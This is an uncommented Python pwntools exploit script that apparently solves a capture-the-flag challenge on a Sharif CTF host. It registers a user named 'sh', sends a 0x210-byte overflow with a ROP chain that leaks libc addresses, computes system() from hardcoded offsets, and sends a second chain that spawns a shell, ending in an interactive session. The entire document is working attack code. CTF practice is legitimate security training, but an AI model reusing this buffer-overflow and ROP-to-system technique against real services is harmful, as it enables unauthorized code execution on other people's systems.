from pwn import *

HOST, PORT = 'ctf.sharif.edu', 54519
# HOST, PORT = '0.0.0.0', 10000
r = remote(HOST, PORT)

def encrypt(c):
	c = bytearray(c)
	for i in range(len(c)-2, -1, -1):
		c[i] ^= c[i+1]
	return str(c)

def decrypt(c):
	c = bytearray(c)
	for i in range(len(c)-1):
		c[i] ^= c[i+1]
	return str(c)

def hash(c):
	r = 0
	for x in c:
		r = r * 31 + ord(x)
	return r % 101

name = 'sh'
r.recvuntil('> ')
r.sendline('1')
r.recvuntil(': ')
r.sendline(encrypt(name))
r.recvuntil(': ')

assert decrypt(encrypt('password')) == 'password'
payload = 'pasword'
r.sendline(encrypt(payload))
r.recvuntil('> ')
r.sendline('2')
r.recvuntil(': ')
r.sendline(name)
r.recvuntil(': ')
r.sendline(payload)
r.recvuntil('> ')
pad = 100
bss = 0x602c00
payload = 'a' * 0x210 + p64(bss) + p64(0x401483) + p64(0x6027a8) + p64(0x4007f0) + p64(0x401483) + p64(0x6028c0 + hash(name) * 8) + p64(0x4007f0) + p64(0x401365)
r.sendline('3')
r.recvuntil('? ')
r.sendline(payload)
r.recvuntil('> ')
r.sendline('4')
r.recvline()
u = lambda x: u64(x[:-1].ljust(8, '\x00'))
p1 = u(r.recvline())
p2 = u(r.recvline())
print hex(p1)
print hex(p2)
system = p1 - 0x6b990 + 0x41490
# system = p1 - 0x6f690 + 0x45390
payload = 'a' * 0x210 + p64(bss) + p64(0x401483) + p64(p2 + 0x20) + p64(system)
r.recvuntil('> ')
r.sendline('3')
r.recvuntil('? ')
r.sendline(payload)
r.recvuntil('> ')
r.sendline('4')
r.interactive()
